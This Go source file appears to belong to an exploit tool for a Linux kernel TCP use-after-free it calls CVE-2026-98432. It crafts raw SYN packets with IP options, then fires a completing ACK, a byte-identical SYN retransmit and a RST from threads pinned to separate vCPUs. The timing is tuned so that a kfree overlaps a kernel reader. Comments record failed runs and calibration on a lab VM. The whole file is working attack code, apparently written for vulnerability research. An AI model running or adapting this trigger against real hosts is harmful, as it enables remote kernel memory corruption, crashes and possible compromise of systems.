package race

// Handshake mode ("fire #2") implements the full UAF trigger for
// CVE-2026-98432 as established by the fire #1 miss analysis:
//
//  1. The round sends a SYN carrying IP options; the kernel creates
//     a request socket with ireq->ireq_opt = P (kmalloc-96) and
//     installs it into the ehash WITHOUT the listener lock.
//  2. The round waits for the real SYN-ACK (recovering the server
//     ISN for the completing ACK) and anchors t=0 at its arrival.
//  3. The three follow-up datagrams are dispatched IN PARALLEL from
//     a common anchor t=0 (the SYN-ACK arrival):
//
//      - t=0: a thread pinned to CPU_P sends the completing ACK;
//        the kernel (on CPU_P) runs tcp_v4_syn_recv_sock(): the
//        child takes inet_opt = P, ireq->ireq_opt is NULL-ed and
//        the child swaps into the ehash. The ACK must go FIRST:
//        the retransmit is sent delta_ack_us AFTER the ACK — that
//        is the only phase where its reader can meet the kfree.
//
//      - t=delta_ack_us: a thread pinned to CPU_T retransmits the
//        BYTE-IDENTICAL SYN (same 4-tuple, same seq, same options).
//        The kernel processes it on CPU_T: __inet_lookup finds the
//        req in the ehash (the child's ehash swap lands later, on
//        CPU_P), tcp_check_req() takes the retransmit branch and
//        tcp_v4_send_synack() / ip_options_build() read
//        ireq->ireq_opt under RCU only (the vulnerable readers).
//
//      - t=delta_ack_us+rst_gap_us: a DEDICATED thread pinned to
//        cpu_rst (an IDLE vCPU, so neither the busy ACK worker nor
//        the busy coordinator can shift the RST) sends a RST
//        (seq = ISN+1, in the child's window). The RST frees P via
//        one of two kernel-side paths (both fixed to kfree_rcu by
//        commit e3f33b0a1d89):
//          * if the child already swapped into the ehash, the RST
//            closes it: inet_sock_destruct() -> kfree(inet_opt=P);
//          * if the ehash swap has NOT landed yet (the calibrated
//            viable case), the RST hits the REQ: embryonic_reset()
//            -> tcp_reqsk_destructor() -> kfree(ireq_opt=P).
//        In both cases the CPU_T reader may still be inside
//        ip_options_build touching P. That overlap is the
//        use-after-free. The child-path latency (RST -> app Close
//        -> kfree) is ~280-500µs on the lab VM, far past the span,
//        so the hit must come from the req path (kernel-side, small
//        C'); the RST must land so its kfree falls inside the
//        reader's span — that is what rst_gap_us / gap_sweep_us
//        tune.
//
//    Every sendto() costs the same ~L microseconds (fire #3: ~200µs
//    under KASAN), so parallel dispatch reproduces the scheduled
//    gaps on the wire: ACK -> retransmit -> RST with gaps delta and
//    delta+rst_gap. Fire #3 used SERIALIZED dispatch (the
//    coordinator waited for the ACK+RST worker before dispatching
//    the retransmit): the RST landed ~200µs after the ACK and the
//    retransmit ~420µs after the RST, so the child was already
//    closed when the retransmit arrived and every "reader" hit
//    created a fresh request socket (2nd SYN-ACK with a NEW ISN —
//    false evidence, 22862/22862 rounds).
//
// Fire #1 (hammer mode) missed because a single CPU processes the
// retransmit and the ACK strictly in order: the reader always
// finishes before the child (and hence P) is created and freed.
// Pinning the two senders to different vCPUs forces the kernel to
// run the two paths in parallel (netif_rx enqueues on the sending
// CPU's softnet backlog).

import (
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"strings"
	"sync/atomic"
	"time"

	"golang.org/x/sys/unix"

	"cve98432/internal/netio"
	"cve98432/internal/packet"
)

// hsJob is one unit of work for a pinned worker: wait until `at`,
// then send the datagrams in order, honouring the gaps.
type hsJob struct {
	at    time.Time // zero = as early as possible
	snd   *netio.Sender
	dst   net.IP
	port  uint16
	sends []hsSend
}

type hsSend struct {
	pkt []byte
	gap time.Duration // wait before the NEXT send
}

type hsResult struct {
	tSent  time.Time // actual send start (instrumentation)
	err    error
	errIdx int // index of the failed send (-1 on success)
}

// hsWorker is a long-lived goroutine bound to one OS thread — and,
// if cpu > 0, to exactly one vCPU. Sending a datagram from a pinned
// thread makes the kernel deliver it through THAT CPU's softnet
// backlog (netif_rx on the sending CPU), which is how the two
// halves of the race land on different CPUs.
type hsWorker struct {
	cpu    int
	pinned atomic.Bool // set once, when the affinity call succeeds
	ready  chan struct{}
	in     chan hsJob
	out    chan hsResult
}

func newHSWorker(cpu int) *hsWorker {
	w := &hsWorker{
		cpu:   cpu,
		ready: make(chan struct{}),
		in:    make(chan hsJob, 1),
		out:   make(chan hsResult, 1),
	}
	go w.run()
	return w
}

func (w *hsWorker) run() {
	if w.cpu > 0 {
		runtime.LockOSThread()
		m := &unix.CPUSet{}
		m.Set(w.cpu)
		if err := unix.SchedSetaffinity(unix.Gettid(), m); err == nil {
			w.pinned.Store(true)
		} else {
			runtime.UnlockOSThread()
		}
	}
	// Signal that the pin attempt is done so the caller can report
	// the final state before the first round (not before the worker
	// goroutine has even run).
	close(w.ready)
	// BUSY-POLL the job channel instead of blocking on it: a parked
	// worker thread wakes through a futex, which costs tens of
	// microseconds under KASAN — the quick-fire post-mortem showed
	// the ACK worker starting its sendto ~100µs AFTER the
	// coordinator's RST, inverting the wire order (1038/1045
	// rounds). The worker owns a dedicated vCPU anyway, so spinning
	// with Gosched yields costs the race nothing.
	for {
		select {
		case j, ok := <-w.in:
			if !ok {
				return
			}
			if !j.at.IsZero() && time.Now().Before(j.at) {
				preciseSleep(j.at.Sub(time.Now()))
			}
			t := time.Now()
			var err error
			idx := -1
			for i, s := range j.sends {
				if err = j.snd.Send(s.pkt, j.dst, j.port); err != nil {
					idx = i
					break
				}
				if s.gap > 0 {
					preciseSleep(s.gap)
				}
			}
			w.out <- hsResult{tSent: t, err: err, errIdx: idx}
		default:
			runtime.Gosched()
		}
	}
}

// nCPUs returns the number of online CPUs visible to the affinity
// mask of the current thread.
func nCPUs() (int, error) {
	var m unix.CPUSet
	if err := unix.SchedGetaffinity(0, &m); err != nil {
		return 0, err
	}
	return m.Count(), nil
}

// newHSWorkers validates the requested pinning and creates the three
// sender workers (retransmit, completing-ACK, dedicated closing-RST).
func (e *Engine) newHSWorkers() (*hsWorker, *hsWorker, *hsWorker, error) {
	h := e.cfg.Handshake
	var m unix.CPUSet
	if err := unix.SchedGetaffinity(0, &m); err != nil {
		// Cannot introspect the mask: allow the pinning and let
		// SchedSetaffinity fail inside the worker (it falls back
		// to unpinned, reported once in runHandshake).
		wRtx := newHSWorker(h.CPURtx)
		wAck := newHSWorker(h.CPUAck)
		wRst := newHSWorker(h.CPURst)
		<-wRtx.ready
		<-wAck.ready
		<-wRst.ready
		return wRtx, wAck, wRst, nil
	}
	ncpu := m.Count()
	if h.CPURtx > 0 && h.CPURtx >= ncpu {
		return nil, nil, nil, fmt.Errorf("handshake.cpu_rtx=%d out of range (%d CPUs online)", h.CPURtx, ncpu)
	}
	if h.CPUAck > 0 && h.CPUAck >= ncpu {
		return nil, nil, nil, fmt.Errorf("handshake.cpu_ack=%d out of range (%d CPUs online)", h.CPUAck, ncpu)
	}
	if h.CPURst > 0 && h.CPURst >= ncpu {
		return nil, nil, nil, fmt.Errorf("handshake.cpu_rst=%d out of range (%d CPUs online)", h.CPURst, ncpu)
	}
	wRtx := newHSWorker(h.CPURtx)
	wAck := newHSWorker(h.CPUAck)
	wRst := newHSWorker(h.CPURst)
	// Wait until all three workers have attempted their pin, so the
	// pinned-state reporting in runHandshake reflects reality.
	<-wRtx.ready
	<-wAck.ready
	<-wRst.ready
	return wRtx, wAck, wRst, nil
}

// buildHandshakeTemplates creates the three handshake-mode
// templates: the SYN (with IP options), the completing ACK and the
// closing RST. Per-round fields (src port, seq, IP ID, the ACK
// field) are patched by the caller. The ACK and RST carry no IP
// options: they are small, and the race is entirely in the SYN
// path — the kernel only needs their seq/ack to complete and close
// the connection.
func (e *Engine) buildHandshakeTemplates() (syn, ack, rst []byte, tcpStart int, err error) {
	src, err := e.sourceIP()
	if err != nil {
		return nil, nil, nil, 0, err
	}
	var opt []byte
	if strings.EqualFold(e.cfg.Payload.OptionsPreset, "custom") {
		opt, err = packet.ParseIPOptionsHex(e.cfg.Payload.CustomHex)
	} else {
		opt, err = packet.BuildIPOptions(e.cfg.Payload.OptionsPreset, src)
	}
	if err != nil {
		return nil, nil, nil, 0, err
	}
	var tcpOpt []byte
	if e.cfg.Payload.TCPCommonOpts {
		tcpOpt = packet.TCPCommonOptions
	}
	if src == nil {
		src = net.ParseIP("0.0.0.0")
	}
	dst := net.ParseIP(e.cfg.Target.IP)
	flags := uint16(0)
	if e.cfg.Payload.DFOnly {
		flags = 0x4000 // DF
	}
	base := packet.Seg{
		SrcIP:   src,
		DstIP:   dst,
		SrcPort: 10000,
		DstPort: uint16(e.cfg.Target.Port),
		TTL:     uint8(e.cfg.Payload.TTL),
		IPFlags: flags,
		Window:  uint16(e.cfg.Payload.Window),
	}
	synSeg := base
	synSeg.TCPFlags = packet.FlagSYN
	synSeg.IPOptions = opt
	synSeg.TCPOptions = tcpOpt
	syn, err = synSeg.Build()
	if err != nil {
		return nil, nil, nil, 0, err
	}
	tcpStart = int(syn[0]&0x0F) * 4
	// The ACK and RST templates have no IP options, so their TCP
	// header starts right after the 20-byte IP header.
	ackSeg := base
	ackSeg.TCPFlags = packet.FlagACK
	ack, err = ackSeg.Build()
	if err != nil {
		return nil, nil, nil, 0, err
	}
	// The closing RST carries the ACK flag (in addition to the
	// ack field): a bare RST[!ACK] is exactly the shape of the
	// kernel's auto-RSTs (no-socket resets), so the lab's egress
	// filter that drops those (see lab/lab-fire.sh) would eat our
	// own closing RST too. RST+ACK is the on-the-wire norm and is
	// handled identically by tcp_rcv_established (the seq check
	// is the same; the ACK bit is inert for an in-window RST).
	rstSeg := base
	rstSeg.TCPFlags = packet.FlagRST | packet.FlagACK
	rst, err = rstSeg.Build()
	if err != nil {
		return nil, nil, nil, 0, err
	}
	return syn, ack, rst, tcpStart, nil
}

// pinCoordinator pins the calling goroutine to a vCPU that is not one
// of the pinned send CPUs (best effort; returns false when that is
// impossible). Keeping the coordinator — which sends the first SYN
// and does all the receiving — off the send CPUs avoids it stealing
// their time slices mid-race.
func pinCoordinator(cpuRtx, cpuAck, cpuRst int) bool {
	ncpu, err := nCPUs()
	if err != nil || ncpu < 3 {
		return false
	}
	busy := map[int]bool{cpuRtx: cpuRtx > 0, cpuAck: cpuAck > 0, cpuRst: cpuRst > 0}
	for c := 0; c < ncpu; c++ {
		if !busy[c] {
			m := &unix.CPUSet{}
			m.Set(c)
			runtime.LockOSThread()
			if err := unix.SchedSetaffinity(unix.Gettid(), m); err == nil {
				return true
			}
			runtime.UnlockOSThread()
			return false
		}
	}
	return false
}

// runHandshake is the handshake-mode coordinator: it runs the
// rounds back to back (one 4-tuple at a time) until ctx is done.
func (e *Engine) runHandshake(ctx context.Context, dst net.IP, dstPort uint16,
	synT, ackT, rstT []byte, tcpStart int, deltaSweep, gapSweep []int) {
	h := e.cfg.Handshake
	// Pin the coordinator to a free CPU when possible (one that is
	// not rtx/ack/rst).
	if h.CPURtx > 0 || h.CPUAck > 0 || h.CPURst > 0 {
		if pinCoordinator(h.CPURtx, h.CPUAck, h.CPURst) {
			e.eventf("info", "handshake: coordinator pinned to a free vCPU")
		}
	}
	// Report pinning failures once, up front. The workers pin
	// themselves during startup; by the time the first round is
	// scheduled the affinity syscalls have long since returned.
	if h.CPURtx > 0 && !e.hsWRTX.pinned.Load() {
		e.eventf("warn", "handshake: cpu_rtx=%d set but the retransmit thread is UNPINNED (race will likely miss)", h.CPURtx)
	}
	if h.CPUAck > 0 && !e.hsWACK.pinned.Load() {
		e.eventf("warn", "handshake: cpu_ack=%d set but the completing-ACK thread is UNPINNED (race will likely miss)", h.CPUAck)
	}
	if h.CPURst > 0 && !e.hsWRST.pinned.Load() {
		e.eventf("warn", "handshake: cpu_rst=%d set but the closing-RST thread is UNPINNED (the RST wire timing stays jittery, expect MISS)", h.CPURst)
	}
	if h.CPURtx == 0 || h.CPUAck == 0 {
		e.eventf("warn", "handshake: CPU pinning is OFF — the retransmit and the ACK will be processed on the same CPU (fire #1 conditions, expect MISS)")
	}

	if e.cfg.Timing.Flows > 1 {
		e.eventf("warn",
			"handshake: flows=%d configured but the mode drives ONE 4-tuple at a time (rounds are serialized)",
			e.cfg.Timing.Flows)
	}

	rnd := rand.New(rand.NewSource(time.Now().UnixNano() + 0x517CC1B7))
	timeout := time.Duration(h.SynackTimeoutMs) * time.Millisecond
	gap := time.Duration(e.cfg.Timing.FlowGapMs) * time.Millisecond
	deltaFixed := time.Duration(h.DeltaAckUs) * time.Microsecond
	gapEps := time.Duration(h.RstGapUs) * time.Microsecond
	observe := time.Duration(h.ObserveUs) * time.Microsecond

	// Per-round buffers: copies of the templates, patched each round.
	synBuf := append([]byte(nil), synT...)
	rtxBuf := append([]byte(nil), synT...)
	ackBuf := append([]byte(nil), ackT...)
	rstBuf := append([]byte(nil), rstT...)

	round := 0
	roundsAtLastEvent := 0
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		e.handshakeRound(ctx, rnd, round, synBuf, rtxBuf, ackBuf, rstBuf, tcpStart, dst, dstPort,
			deltaFixed, gapEps, observe, timeout, deltaSweep, gapSweep)
		round++
		if round-roundsAtLastEvent >= 100 {
			roundsAtLastEvent = round
			e.eventf("info",
				"handshake: rounds=%d skipped=%d reader-evidence=%d synack=%d",
				e.hsRounds.Load(), e.hsSkip.Load(), e.hsSynAck2.Load(), e.hsSynAck.Load())
		}
		if gap > 0 {
			select {
			case <-ctx.Done():
				return
			case <-time.After(gap):
			}
		}
	}
}

// handshakeRound performs one full round:
//
//	SYN -> wait SYN-ACK -> [t=0] ACK (CPU_P thread)
//	                            [t=delta] retransmit (CPU_T thread)
//	                            [t=delta+eps] RST (CPU_R thread)
//	    -> observe for a second SYN-ACK (reader evidence).
//
// The three follow-ups are dispatched in parallel from the common
// anchor t=0 (see the file header for the full mechanism and the
// fire #3 post-mortem). delta must keep the retransmit's ehash
// lookup INSIDE the child-creation window (lookup finds the req,
// not the swapped-in child) while eps + the RST close path keep the
// kfree(P) at/after the retransmit's ireq_opt read.
func (e *Engine) handshakeRound(ctx context.Context, rnd *rand.Rand, round int,
	synBuf, rtxBuf, ackBuf, rstBuf []byte, tcpStart int,
	dst net.IP, dstPort uint16, delta, eps, observe, timeout time.Duration,
	deltaSweep, gapSweep []int) {
	deltaUs := int(delta / time.Microsecond)
	if len(deltaSweep) > 0 {
		deltaUs = deltaSweep[round%len(deltaSweep)]
		delta = time.Duration(deltaUs) * time.Microsecond
	}
	// Per-round RST-gap cycle: like the delta sweep, a non-empty
	// list overrides the fixed gap for this round (the lab's
	// calibration fires sweep the hit window in ONE run).
	epsUs := int(eps / time.Microsecond)
	if len(gapSweep) > 0 {
		epsUs = gapSweep[round%len(gapSweep)]
		eps = time.Duration(epsUs) * time.Microsecond
	}
	srcPort := uint16(10000 + uint64(round)%48000)
	seq := e.seqBase + uint32(rnd.Intn(0x40000000))
	id := uint16(round % 65535)

	// Patch all four datagrams for this round.
	patch(synBuf, tcpStart, srcPort, seq, id)
	patch(rtxBuf, tcpStart, srcPort, seq, id)
	packet.Rechecksum(synBuf)
	packet.Rechecksum(rtxBuf) // byte-identical to synBuf by construction
	// The completing ACK must carry seq = ISN+1: the request
	// socket's window starts at rcv_nxt = ISN+1 (the SYN consumed
	// ISN). An ACK with seq = ISN would be out of window and
	// silently dropped (dup-ACK), so the child would never be
	// created. The RST carries the same seq (= ISN+1 = the
	// child's rcv_nxt), in-window for the child.
	patch(ackBuf, 20, srcPort, seq+1, id) // no IP options: tcp at offset 20
	patch(rstBuf, 20, srcPort, seq+1, id)
	packet.Rechecksum(ackBuf)
	packet.Rechecksum(rstBuf)

	// Step 1: the original SYN.
	if err := e.snd.Send(synBuf, dst, dstPort); err != nil {
		e.errCount.Add(1)
		return
	}
	e.synCount.Add(1)

	// Step 2: wait for the real SYN-ACK for THIS 4-tuple.
	deadline := time.Now().Add(timeout)
	var isn2 uint32
	got := false
	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return
		default:
		}
		pkt, at, err := e.hsTap.Recv(2 * time.Millisecond)
		if err != nil {
			if !errors.Is(err, netio.ErrTimeout) {
				return // tap broken
			}
			continue
		}
		p, ok := netio.ParseTCP(pkt)
		if !ok {
			continue
		}
		if p.IsSynAck() && p.DstPort == srcPort && p.SrcPort == dstPort {
			isn2 = p.Seq
			got = true
			e.hsSynAck.Add(1)
			e.hsLastRep.Store(at.UnixNano())
			break
		}
	}
	if !got {
		e.hsSkip.Add(1)
		return
	}

	// Complete the ACK and RST now that we know the server ISN.
	// ack = ISN2+1 in both (a RST with a valid ack field is
	// unconditionally fine; a RST with a stale one can be dropped).
	binary.BigEndian.PutUint32(ackBuf[20+8:20+12], isn2+1)
	binary.BigEndian.PutUint32(rstBuf[20+8:20+12], isn2+1)
	packet.Rechecksum(ackBuf)
	packet.Rechecksum(rstBuf)

	// Steps 3-4: PARALLEL dispatch of the three follow-ups from a
	// common anchor t0 (see the file header for the full mechanism):
	//
	//	  t0            CPU_P worker: the completing ACK
	//	  t0+delta      CPU_T worker: the byte-identical retransmit
	//	  t0+delta+eps  CPU_R worker: the closing RST
	//
	// Fire #3's serialized dispatch (wait for the ACK+RST worker,
	// THEN dispatch the retransmit at "tA+delta") made the retransmit
	// arrive ~420µs after the RST: the child was already closed, the
	// retransmit hit the listener and every 2nd SYN-ACK was a fresh
	// request socket (new ISN — false reader evidence). Dispatching
	// all three from the same anchor puts the scheduled gaps
	// (delta, delta+eps) on the wire, because every sendto() costs
	// the same ~L microseconds under KASAN.
	//
	// The RST goes out from a DEDICATED worker (cpu_rst), not from
	// the ACK worker (it is inside its ACK sendto() (~200µs under
	// KASAN) when the RST is due) nor from the coordinator (it is
	// busy sending SYNs and polling the tap, so the fires 1-5b pcaps
	// show its RST landing tens of µs late with a jitter as wide as
	// the ~10µs hit window). A worker pinned to an IDLE vCPU sends
	// the RST at t0+delta+eps within a few µs.
	t0 := time.Now()
	e.hsWACK.in <- hsJob{
		snd:   e.snd,
		dst:   dst,
		port:  dstPort,
		sends: []hsSend{{pkt: ackBuf}},
	}
	e.hsWRTX.in <- hsJob{
		at:    t0.Add(delta),
		snd:   e.snd,
		dst:   dst,
		port:  dstPort,
		sends: []hsSend{{pkt: rtxBuf}},
	}
	e.hsWRST.in <- hsJob{
		at:    t0.Add(delta + eps),
		snd:   e.snd,
		dst:   dst,
		port:  dstPort,
		sends: []hsSend{{pkt: rstBuf}},
	}

	// All three workers always report one result per dispatched job;
	// drain unconditionally (the out channels are 1-deep: a stale
	// result would deadlock the next round's dispatch).
	rA := <-e.hsWACK.out
	rB := <-e.hsWRTX.out
	rC := <-e.hsWRST.out
	if rC.err != nil {
		e.hsSendErr("rst", rC.errIdx, rC.err)
		e.errCount.Add(1)
		return
	}
	if rA.err != nil {
		e.hsSendErr("ack", rA.errIdx, rA.err)
		e.errCount.Add(1)
		return
	}
	if rB.err != nil {
		e.hsSendErr("retransmit", rB.errIdx, rB.err)
		e.errCount.Add(1)
		return
	}
	e.rtxCount.Add(3) // retransmit + ACK + RST
	e.hsRounds.Add(1)

	// Step 6: observe the 4-tuple briefly. A SECOND SYN-ACK here
	// can only be the reader's (the req's own SYN-ACK timer is
	// ~1 s away and the req is gone by then): that is the
	// calibration evidence the retransmit still hit the request
	// socket. A RST from the target means the retransmit arrived
	// AFTER the child swap (no reader) — also useful phase data.
	//
	// The FIRST response to this round's source port ends the
	// round: by the time it arrives on the wire, the kernel has
	// long since done the vulnerable retransmit processing (the
	// kfree/read ordering — and any KASAN report — is decided by
	// then), so the window only bounds rounds whose response
	// never shows up. pcap evidence comes from the tap-independent
	// docker0 capture, so a short window never loses the report.
	if observe <= 0 {
		return
	}
	obs := time.Now().Add(observe)
	for time.Now().Before(obs) {
		select {
		case <-ctx.Done():
			return
		default:
		}
		pkt, at, err := e.hsTap.Recv(1 * time.Millisecond)
		if err != nil {
			continue
		}
		p, ok := netio.ParseTCP(pkt)
		if !ok || p.DstPort != srcPort {
			continue
		}
		switch {
		case p.IsSynAck():
			n := e.hsSynAck2.Add(1)
			e.hsLastRep.Store(at.UnixNano())
			// A KASAN-slowed kernel can produce one per round: log
			// the first hit and every 25th, never per packet.
			if n == 1 || n%25 == 0 {
				e.eventf("info",
					"handshake: READER EVIDENCE (2nd SYN-ACK, ipopt=%dB) round=%d delta=%dus count=%d",
					p.IPOptLen, round, deltaUs, n)
			}
			return
		case p.IsRST():
			e.hsRstTgt.Add(1)
			e.hsLastRep.Store(at.UnixNano())
			return
		}
	}
}

// hsSendErr reports a failed worker send, throttled (the first 3,
// then every 100th) so a persistent per-round error stays visible
// without flooding the event stream. idx names the failed datagram
// inside the job (0 = first send).
func (e *Engine) hsSendErr(what string, idx int, err error) {
	n := e.hsSendErrs.Add(1)
	if n <= 3 || n%100 == 0 {
		e.eventf("warn", "handshake: %s send #%d failed (total %d): %v", what, idx, n, err)
	}
}
